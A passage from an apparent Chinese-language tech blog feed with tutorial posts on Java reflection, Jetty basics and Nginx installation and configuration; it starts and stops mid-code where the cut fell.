class="line"><span class="comment">			String modifiers = Modifier.toString(i);</span></span><br><span class="line"><span class="comment">			System.out.println(modifiers);</span></span><br><span class="line"><span class="comment">			</span></span><br><span class="line"><span class="comment">			Class type = field.getType();</span></span><br><span class="line"><span class="comment">			//System.out.println("type名称"+type.getName());</span></span><br><span class="line"><span class="comment">			System.out.println(type.getSimpleName());</span></span><br><span class="line"><span class="comment">			</span></span><br><span class="line"><span class="comment">			System.out.println(field.getName());</span></span><br><span class="line"><span class="comment">			</span></span><br><span class="line"><span class="comment">		&#125;*/</span></span><br><span class="line">		</span><br><span class="line">		StringBuffer sb = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">		sb.append(Modifier.toString(c.getModifiers()) + <span class="string">" class "</span> + c.getSimpleName() + <span class="string">"&#123;"</span>);</span><br><span class="line">		<span class="keyword">for</span> (Field field : dfs) &#123;</span><br><span class="line">			sb.append(<span class="string">"\t"</span>);</span><br><span class="line">			sb.append(Modifier.toString(field.getModifiers()) + <span class="string">" "</span>);</span><br><span class="line">			sb.append(field.getType().getSimpleName() + <span class="string">" "</span>);</span><br><span class="line">			sb.append(field.getName() + <span class="string">";\n"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		sb.append(<span class="string">"&#125;"</span>);</span><br><span class="line">		System.out.println(sb);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="java-lang-reflect-Filed-获取某个指定的属性"><a href="#java-lang-reflect-Filed-获取某个指定的属性" class="headerlink" title="java.lang.reflect.Filed; 获取某个指定的属性"></a>java.lang.reflect.Filed; 获取某个指定的属性</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectTest05</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		</span><br><span class="line">		Class c = Class.forName(<span class="string">"com.caifenglin.reflect.Student"</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 获取所有属性</span></span><br><span class="line">		<span class="comment">//Field[] fs = c.getDeclaredFields();</span></span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 获取某个特定属性，获取name属性</span></span><br><span class="line">		Field df = c.getDeclaredField(<span class="string">"name"</span>);</span><br><span class="line">		</span><br><span class="line">		Object o = c.newInstance();</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 打破封装</span></span><br><span class="line">		df.setAccessible(<span class="keyword">true</span>);<span class="comment">// 使用反射机制可以打破封装机制，使java对象的属性不安全</span></span><br><span class="line">		</span><br><span class="line">		df.set(o, <span class="string">"caifenglin"</span>);</span><br><span class="line">		</span><br><span class="line">		System.out.println(df.get(o));</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="java-lang-reflect-Method-获取类中的方法反编译所有类中的方法"><a href="#java-lang-reflect-Method-获取类中的方法反编译所有类中的方法" class="headerlink" title="java.lang.reflect.Method;获取类中的方法反编译所有类中的方法"></a>java.lang.reflect.Method;获取类中的方法反编译所有类中的方法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectMethod01</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		<span class="comment">// 获取类</span></span><br><span class="line">		<span class="comment">//Class c = Class.forName("com.caifenglin.reflect.Student");</span></span><br><span class="line">		Class c = Class.forName(<span class="string">"java.lang.String"</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 获取所有方法</span></span><br><span class="line">		<span class="comment">/*Method[] methods = c.getDeclaredMethods();</span></span><br><span class="line"><span class="comment">		for (Method method : methods) &#123;</span></span><br><span class="line"><span class="comment">			</span></span><br><span class="line"><span class="comment">			// 修饰符</span></span><br><span class="line"><span class="comment">			System.out.println(Modifier.toString(method.getModifiers()));</span></span><br><span class="line"><span class="comment">			</span></span><br><span class="line"><span class="comment">			// 方法的返回值类型</span></span><br><span class="line"><span class="comment">			Class returnType = method.getReturnType();</span></span><br><span class="line"><span class="comment">			System.out.println(returnType.getSimpleName());</span></span><br><span class="line"><span class="comment">			</span></span><br><span class="line"><span class="comment">			// 方法名</span></span><br><span class="line"><span class="comment">			System.out.println(method.getName());</span></span><br><span class="line"><span class="comment">			</span></span><br><span class="line"><span class="comment">			// 方法的形式参数</span></span><br><span class="line"><span class="comment">			Class[] paramterTypes = method.getParameterTypes();</span></span><br><span class="line"><span class="comment">			for (Class paramterType : paramterTypes) &#123;</span></span><br><span class="line"><span class="comment">				System.out.println(paramterType.getSimpleName());</span></span><br><span class="line"><span class="comment">			&#125;</span></span><br><span class="line"><span class="comment">			</span></span><br><span class="line"><span class="comment">		&#125;*/</span></span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 反编译</span></span><br><span class="line">		StringBuffer sb = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">		sb.append(Modifier.toString(c.getModifiers()) + <span class="string">" class "</span>);</span><br><span class="line">		sb.append(c.getSimpleName() + <span class="string">"&#123;\n"</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 获取所有方法</span></span><br><span class="line">		Method[] methods = c.getDeclaredMethods();</span><br><span class="line">		<span class="keyword">for</span> (Method m : methods) &#123;</span><br><span class="line">			sb.append(<span class="string">"\t"</span>);</span><br><span class="line">			sb.append(Modifier.toString(m.getModifiers()) + <span class="string">" "</span>);</span><br><span class="line">			sb.append(m.getReturnType().getSimpleName()+ <span class="string">" "</span>);</span><br><span class="line">			sb.append(m.getName()+<span class="string">"("</span>);</span><br><span class="line">			</span><br><span class="line">			<span class="comment">// 形参</span></span><br><span class="line">			Class[] parameterTypes = m.getParameterTypes();</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; parameterTypes.length; i++) &#123;</span><br><span class="line">				Class parameterType = parameterTypes[i];</span><br><span class="line">				<span class="keyword">if</span>(i == parameterTypes.length - <span class="number">1</span>) &#123;</span><br><span class="line">					sb.append(parameterType.getSimpleName());</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					sb.append(parameterType.getSimpleName() + <span class="string">", "</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			sb.append(<span class="string">")&#123;&#125;\n"</span>);</span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">		sb.append(<span class="string">"&#125;"</span>);</span><br><span class="line">		</span><br><span class="line">		System.out.println(sb);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="获取某个特定的方法，通过反射机制执行"><a href="#获取某个特定的方法，通过反射机制执行" class="headerlink" title="获取某个特定的方法，通过反射机制执行"></a>获取某个特定的方法，通过反射机制执行</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取某个特定的方法，通过反射机制执行</span></span><br><span class="line"><span class="comment"> * 以前:Student student = new Student();</span></span><br><span class="line"><span class="comment"> * boolean isSuccess = student.login("admin","123");</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> caifenglin</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectMethod02</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		<span class="comment">// 1.获取类</span></span><br><span class="line">		Class c = Class.forName(<span class="string">"com.caifenglin.reflect.Student"</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 获取某个特定的方法</span></span><br><span class="line">		<span class="comment">// 通过:方法名+形参列表</span></span><br><span class="line">		Method m = c.getDeclaredMethod(<span class="string">"login"</span>, String<span class="class">.<span class="keyword">class</span>, <span class="title">String</span>.<span class="title">class</span>)</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 通过反射机制执行login方法</span></span><br><span class="line">		Object o = c.newInstance();</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 调用o对象的m方法，传递"admin", "123"参数，方法的执行结果是retValue</span></span><br><span class="line">		Object retValue = m.invoke(o, <span class="string">"admin"</span>, <span class="string">"123"</span>);</span><br><span class="line">		System.out.println(retValue);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="java-lang-reflect-Constructor-获取类中的构造方法反编译所有类中的所有构造方法"><a href="#java-lang-reflect-Constructor-获取类中的构造方法反编译所有类中的所有构造方法" class="headerlink" title="java.lang.reflect.Constructor;获取类中的构造方法反编译所有类中的所有构造方法"></a>java.lang.reflect.Constructor;获取类中的构造方法反编译所有类中的所有构造方法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectConstruct01</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 1.获取类</span></span><br><span class="line">		Class c = Class.forName(<span class="string">"java.lang.String"</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 2.获取所有的构造</span></span><br><span class="line">		Constructor[] cs = c.getDeclaredConstructors();</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		for (Constructor constructor : cs) &#123;</span></span><br><span class="line"><span class="comment">			// 获取修饰符</span></span><br><span class="line"><span class="comment">			System.out.println(Modifier.toString(constructor.getModifiers()));</span></span><br><span class="line"><span class="comment">			// 获取构造方法名</span></span><br><span class="line"><span class="comment">			System.out.println(c.getName());</span></span><br><span class="line"><span class="comment">			// 构造方法的形式参数列表</span></span><br><span class="line"><span class="comment">			Class[] parameterTypes = constructor.getParameterTypes();</span></span><br><span class="line"><span class="comment">			for (Class parameterType : parameterTypes) &#123;</span></span><br><span class="line"><span class="comment">				System.out.println(parameterType.getSimpleName());</span></span><br><span class="line"><span class="comment">			&#125;</span></span><br><span class="line"><span class="comment">		&#125;*/</span></span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 反编译</span></span><br><span class="line">		StringBuffer sb = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">		sb.append(Modifier.toString(c.getModifiers()) + <span class="string">" class "</span> + c.getSimpleName() + <span class="string">"&#123;\n"</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 构造方法</span></span><br><span class="line">		<span class="keyword">for</span> (Constructor constructor : cs) &#123;</span><br><span class="line">			sb.append(<span class="string">"\t"</span>);</span><br><span class="line">			sb.append(Modifier.toString(constructor.getModifiers()) + <span class="string">" "</span>);</span><br><span class="line">			sb.append(c.getSimpleName() + <span class="string">"("</span>);</span><br><span class="line">			<span class="comment">// 形参</span></span><br><span class="line">			Class[] parameterTypes = constructor.getParameterTypes();</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; parameterTypes.length; i++) &#123;</span><br><span class="line">				Class parameterType = parameterTypes[i];</span><br><span class="line">				<span class="keyword">if</span>(i == parameterTypes.length - <span class="number">1</span>) &#123;</span><br><span class="line">					sb.append(parameterType.getSimpleName());</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					sb.append(parameterType.getSimpleName() + <span class="string">", "</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			sb.append(<span class="string">")&#125;\n"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		sb.append(<span class="string">"&#125;"</span>);</span><br><span class="line">		System.out.println(sb);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="java-lang-reflect-Constructor-获取某个特定的构造方法"><a href="#java-lang-reflect-Constructor-获取某个特定的构造方法" class="headerlink" title="java.lang.reflect.Constructor;获取某个特定的构造方法"></a>java.lang.reflect.Constructor;获取某个特定的构造方法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectConstruct02</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 1.获取类</span></span><br><span class="line">		Class c = Class.forName(<span class="string">"com.caifenglin.reflect.Customer"</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 2.获取特定的构造方法</span></span><br><span class="line">		Constructor dc = c.getDeclaredConstructor(String<span class="class">.<span class="keyword">class</span>, <span class="title">int</span>.<span class="title">class</span>)</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 3.创建对象</span></span><br><span class="line">		Object o = dc.newInstance(<span class="string">"李四"</span>, <span class="number">24</span>);</span><br><span class="line">		</span><br><span class="line">		System.out.println(o);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上反射中的实体类：<br>员工类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.caifenglin.reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Employee</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// Field</span></span><br><span class="line">	<span class="keyword">private</span> String name;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// Constructor</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Employee</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"Employee无参构造方法执行"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Employee</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.name = name;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// method</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">work</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.print(<span class="string">"在工作!"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>student类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">	<span class="comment">// Field</span></span><br><span class="line">	<span class="keyword">private</span> String name;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">	<span class="keyword">protected</span> String address;</span><br><span class="line">	<span class="keyword">boolean</span> sex;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">login</span><span class="params">(String username, String password)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="string">"admin"</span>.equals(username) &amp;&amp; <span class="string">"123"</span>.equals(password)) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">m1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"hello reflect"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可变长参数举例</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 关于Java中的可变长参数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> caifenglin</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test01</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 可变长参数只能出现一次，并且只能出现在最后的位置</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">m1</span><span class="params">(<span class="keyword">int</span>... a)</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"Test"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">m1</span><span class="params">(<span class="keyword">int</span> a)</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 如果有精确匹配的方法，则调用该精确方法；可变参数可以看做数组</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		m1();</span><br><span class="line">		m1(<span class="number">2</span>);</span><br><span class="line">		m1(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">		m1(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Jetty学习上</title>
    <url>/Jetty/563c4e3.html</url>
    <content><![CDATA[<h2 id="Jetty大纲视图"><a href="#Jetty大纲视图" class="headerlink" title="Jetty大纲视图"></a>Jetty大纲视图</h2><p><img src="/images/jetty/jetty01.png" alt="Jetty大纲视图"></p><h2 id="什么是Jetty"><a href="#什么是Jetty" class="headerlink" title="什么是Jetty?"></a>什么是Jetty?</h2><p>简单来讲 Jetty就是一个开源的HTTP服务器和Servlet引擎，它可以为JSP和Servlet提供运行时环境。比如Java Web应用最常见的Servlet容器Tomcat。由于其轻量级、灵活的特性，Jetty也被应用于一些知名产品中，例如ActiveMQ、Maven、Spark、GoogleAppEngine、Eclipse、Hadoop等。</p><h2 id="为什么使用Jetty"><a href="#为什么使用Jetty" class="headerlink" title="为什么使用Jetty?"></a>为什么使用Jetty?</h2><p>异步的Servlet，支持更高的并发量<br>模块化的设计，更灵活，更容易定制，也意味着更高的资源利用率<br>在面对大量的长连接的业务场景下，Jetty默认采用的NIO模型是更好的选择<br>将Jetty嵌入到应用中，使一个普通应用可以快速支持http服务</p><a id="more"></a><h2 id="Jeety的基本架构"><a href="#Jeety的基本架构" class="headerlink" title="Jeety的基本架构"></a>Jeety的基本架构</h2><p>Jetty的架构比较简单，核心组件主要是由Servlet和Handle组成。其中Server的Handler是其比较重要的一个数据模型，Jetty中所有的组件都是基于Handler。<br><img src="/images/jetty/jetty02.png" alt="Jetty基本架构"></p><h2 id="与tomcat对比"><a href="#与tomcat对比" class="headerlink" title="与tomcat对比"></a>与tomcat对比</h2><p>Jetty比较容易贴合第三方框架，比如你可以直接用spring配置一个Jetty服务<br>直接将Jetty作为提供HTTP服务的组件，嵌入到应用中<br>Jetty是面向Handle的架构，而Tomcat是面向容器的架构<br>Jetty默认采用NIO技术 ，而Tomcat默认是BIO<br>Jetty高度模块化，可以很灵活的管理扩展组件，而Tomcat对其他组件的管理则相对困难</p><p>Tomcat架构图如下:<br><img src="/images/jetty/jetty03.png" alt="Tomcat基本架构"></p><h2 id="使用Jetty"><a href="#使用Jetty" class="headerlink" title="使用Jetty"></a>使用Jetty</h2><p><img src="/images/jetty/jetty04.png" alt="Jetty版本"><br><img src="/images/jetty/jetty05.png" alt="Jetty目录"></p>]]></content>
      <categories>
        <category>Jetty</category>
      </categories>
      <tags>
        <tag>Jetty</tag>
      </tags>
  </entry>
  <entry>
    <title>第1章 Nginx介绍</title>
    <url>/Nginx/f8a6e8f7.html</url>
    <content><![CDATA[<h2 id="Nginx介绍"><a href="#Nginx介绍" class="headerlink" title="Nginx介绍"></a>Nginx介绍</h2><p>Nginx(发音同engine x)是一款轻量级的Web服务器/反向代理服务器及电子邮件(IMAP/POP3)代理服务器。<br>最早由俄罗斯的程序设计师Igor SYsoev所开发，并在一个BSD-like协议下发行。<br>其特点是轻量级,占有内存少，并发能力强，目前发展势头强劲。<br>web领域最经典的lamp组合已经变成lnmp组合。</p><p>注：开源协议:GPL(带有病毒性质，使用GPL必须以GPL开源)、BSD(可以商用，相对宽松)、apache。</p><h3 id="谁在用Nginx"><a href="#谁在用Nginx" class="headerlink" title="谁在用Nginx"></a>谁在用Nginx</h3><p>目前国内的一线门户网站，如网易、搜狐、腾讯。以及大量新兴网站，如自学it网、豆瓣。</p><h3 id="Nginx的占有率变化"><a href="#Nginx的占有率变化" class="headerlink" title="Nginx的占有率变化"></a>Nginx的占有率变化</h3><p>下图是世界范围内，排名前1000,10000的网站的webserver比例<br><img src="/images/nginx/01.png" alt="Nginx"></p><p>Apache占有率高主要是历史原因。因为网站一旦运行，不轻易更换。</p><h2 id="Nginx编译与启动"><a href="#Nginx编译与启动" class="headerlink" title="Nginx编译与启动"></a>Nginx编译与启动</h2><h3 id="编译安装"><a href="#编译安装" class="headerlink" title="编译安装"></a>编译安装</h3><p>到官方网站:<a href="http:/nginx.org" title="nginx" target="_blank" rel="noopener">http:/nginx.org</a>寻找最新stable版下载。例如当前最新的<a href="http://nginx.org/download/nginx-1.15.9.tar.gz" title="nginx" target="_blank" rel="noopener">http://nginx.org/download/nginx-1.15.9.tar.gz</a><br>安装准备:nginx依赖于pcre库，要先安装pcre</p><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># yum install pcre pcre-devel</span></span><br><span class="line"><span class="meta"># cd /usr/local/src</span></span><br><span class="line"><span class="meta"># wget http://nginx.org/download/nginx-1.15.9.tar.gz</span></span><br><span class="line"><span class="meta"># tar -zxvf nginx-1.15.9.tar.gz</span></span><br><span class="line"><span class="meta"># cd nginx-1.15.9</span></span><br><span class="line"><span class="meta"># ./configure --prefix=/usr/local/nginx</span></span><br><span class="line"><span class="meta"># make &amp;&amp; make install</span></span><br></pre></td></tr></table></figure><p>为什么要先装pcre?<br>因为:nginx要在rewrite是要解析正则表达式,PCRE是正则解析库。</p><h3 id="nginx目录介绍"><a href="#nginx目录介绍" class="headerlink" title="nginx目录介绍"></a>nginx目录介绍</h3><p>cd /usr/local/nginx，看到如下4个目录</p><ul><li>conf: 配置文件</li><li>html: 网页文件</li><li>logs: 日志文件</li><li>sbin: 主要二进制程序</li></ul><h3 id="启动nginx"><a href="#启动nginx" class="headerlink" title="启动nginx"></a>启动nginx</h3><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cd</span> <span class="string">/usr/local/nginx</span></span><br><span class="line"><span class="string">./sbin/nginx</span></span><br></pre></td></tr></table></figure><p>如果没有出现错误提示，则启动成功了。如果有错误提示，则根据错误提示再做处理，常见的错误是“80端口被占用”。</p><h3 id="80端口被占用的解决方案"><a href="#80端口被占用的解决方案" class="headerlink" title="80端口被占用的解决方案"></a>80端口被占用的解决方案</h3><p>如果出现不能绑定80端口，80端口已经被占用。<br><img src="/images/nginx/02.png" alt="Nginx"><br>(有时候是自己安装了apache,nginx等，还有更多情况是操作系统自带了apche并作为服务启动)<br><img src="/images/nginx/03.png" alt="Nginx"><br>解决:把占用80端口的软件或服务关闭即可。<br>如果是linux系统自带的apache且自动启动。service httpd stop<br>如果是自行编译安装的，可以# /path/to/apacht/bin/apachctl stop</p><p>如果检测确实没有其他程序占据80端口，但仍报此错，则问题可能是因为Nignx试图同时监听IPV4和IPV6的80端口导致的的(Nginx 1.4.0版本曾有此问题)</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">server</span> &#123;</span><br><span class="line">	<span class="attribute"><span class="nomarkup">listen</span></span>： 80</span><br><span class="line">	<span class="attribute"><span class="nomarkup">listen</span></span><span class="meta"> [::]:80;</span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure><p>可以按如下2种办法修改</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">	<span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">	<span class="attribute">listen</span> [::]:<span class="number">80</span> ipv6pnly=<span class="literal">on</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">server</span> &#123;</span><br><span class="line">	<span class="selector-tag">listen</span> <span class="selector-attr">[::]</span><span class="selector-pseudo">:80</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Nginx-命令参数"><a href="#Nginx-命令参数" class="headerlink" title="Nginx 命令参数"></a>Nginx 命令参数</h2><p>kill -INT 17800<br>kill -USR1<br>如果不愿意用信号来控制，nginx程序也可以用一些参数，达到效果。如：<br>nginx -t 作用：测试配置是否正确<br>nginx -s reload 作用：加载最新配置<br>nginx -s stop 作用：立即停止(停止请求立即停止)<br>nginx -s quit 作用：优雅停止(请求结束然后停止)<br>nginx -s reopen 作用：重新打开日志</p>]]></content>
      <categories>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>第2章 Nginx应用</title>
    <url>/Nginx/76300df3.html</url>
    <content><![CDATA[<h2 id="Nginx配置段详解"><a href="#Nginx配置段详解" class="headerlink" title="Nginx配置段详解"></a>Nginx配置段详解</h2><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 全局区</span></span><br><span class="line"><span class="comment">#user  nobody;</span></span><br><span class="line"><span class="comment"># 有1个工作的子进程，可以自行修改，但太大无益，因为要争夺CPU</span></span><br><span class="line"><span class="comment"># 一般设置为CPU 数*核数</span></span><br><span class="line"><span class="attribute">worker_processes</span>  <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#error_log  logs/error.log;</span></span><br><span class="line"><span class="comment">#error_log  logs/error.log  notice;</span></span><br><span class="line"><span class="comment">#error_log  logs/error.log  info;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#pid        logs/nginx.pid;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section">events</span> &#123;</span><br><span class="line">	<span class="comment"># 一般是配置Nginx连接的特性，如1个worker能同时允许多少连接</span></span><br><span class="line">	<span class="comment"># 这是指一个子进程最大允许连接1024个连接。</span></span><br><span class="line">    <span class="attribute">worker_connections</span>  <span class="number">1024</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这是配置http服务器的主要部分</span></span><br><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    <span class="attribute">include</span>       mime.types;</span><br><span class="line">    <span class="attribute">default_type</span>  application/octet-stream;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#log_format  main  '$remote_addr - $remote_user [$time_local] "$request" '</span></span><br><span class="line">    <span class="comment">#                  '$status $body_bytes_sent "$http_referer" '</span></span><br><span class="line">    <span class="comment">#                  '"$http_user_agent" "$http_x_forwarded_for"';</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#access_log  logs/access.log  main;</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">sendfile</span>        <span class="literal">on</span>;</span><br><span class="line">    <span class="comment">#tcp_nopush     on;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#keepalive_timeout  0;</span></span><br><span class="line">    <span class="attribute">keepalive_timeout</span>  <span class="number">65</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#gzip  on;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 这是配置虚拟主机部分</span></span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line">        <span class="attribute">listen</span>       <span class="number">80</span>;</span><br><span class="line">        <span class="attribute">server_name</span>  localhost;</span><br><span class="line"></span><br><span class="line">        <span class="comment">#charset koi8-r;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#access_log  logs/host.access.log  main;</span></span><br><span class="line"></span><br><span class="line">        <span class="attribute">location</span> / &#123;</span><br><span class="line">            <span class="attribute">root</span>   html;</span><br><span class="line">            <span class="attribute">index</span>  index.html index.htm;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">#error_page  404              /404.html;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># redirect server error pages to the static page /50x.html</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="attribute">error_page</span>   <span class="number">500</span> <span class="number">502</span> <span class="number">503</span> <span 